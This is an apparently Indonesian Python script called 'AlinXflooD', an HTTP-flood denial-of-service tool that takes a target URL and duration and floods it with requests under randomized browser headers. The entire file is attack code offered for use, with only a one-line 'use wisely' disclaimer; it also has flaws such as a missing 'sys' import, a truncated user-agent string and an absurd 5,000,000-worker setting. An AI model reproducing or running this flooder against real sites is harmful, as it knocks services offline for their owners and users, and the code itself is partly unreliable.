import os
import time
import subprocess
import requests
import random
import pyfiglet
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor
init(autoreset=True)
def check_and_install_modules():
    required_modules = ['requests', 'pyfiglet', 'colorama']

    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            print(f"Module '{module}' tidak ditemukan, menginstal...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", module])
def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')
def print_figlet():
    try:
        result = pyfiglet.figlet_format('AlinXflooD', font='slant')
        print(Fore.MAGENTA + result)
    except Exception as e:
        print("Error dengan pyfiglet:", e)
def generate_random_headers():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
        'Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/22.0 Firefox/22.0',
        'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Nexus 7 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.94 Safari/>
    ]

    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-GB,en;q=0.9,en-US;q=0.8,id;q=0.7',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    return headers
def send_request(url):
    try:
        headers = generate_random_headers()
        requests.get(url, headers=headers)
    except requests.exceptions.RequestException:
        pass
def send_requests(url, requests_per_second, duration):
    start_time = time.time()
    total_requests_sent = 0
    with ThreadPoolExecutor(max_workers=requests_per_second) as executor:
        while time.time() - start_time < duration:
            futures = [executor.submit(send_request, url) for _ in range(requests_per_second)]
            for future in futures:
                future.result()
            total_requests_sent += requests_per_second
            print(f"Attack sending to website", end="\r")
            time.sleep(0.001)
    print("\nAttack Succesfully!")
def main():
    check_and_install_modules()
    clear_terminal()
    print_figlet()

    print("CyberTeam Originally from East Java - Malang")
    print("Gunakan dengan bijak! Jangan disalahgunakan.")
    url = input('Masukkan URL target: ').strip()
    if not (url.startswith('http://') or url.startswith('https://')):
        print('URL harus dimulai dengan (http:// atau https://)')
        return
    try:
        duration = int(input('Masukkan durasi serangan dalam detik (1-60): '))
        if duration <= 0 or duration > 60:
            print('Durasi harus antara 1-60 detik!')
            return
    except ValueError:
        print('Durasi harus berupa angka!')
        return
    requests_per_second = 5000000
    print(f'Attack send!')
    send_requests(url, requests_per_second, duration)

if __name__ == "__main__":
    main()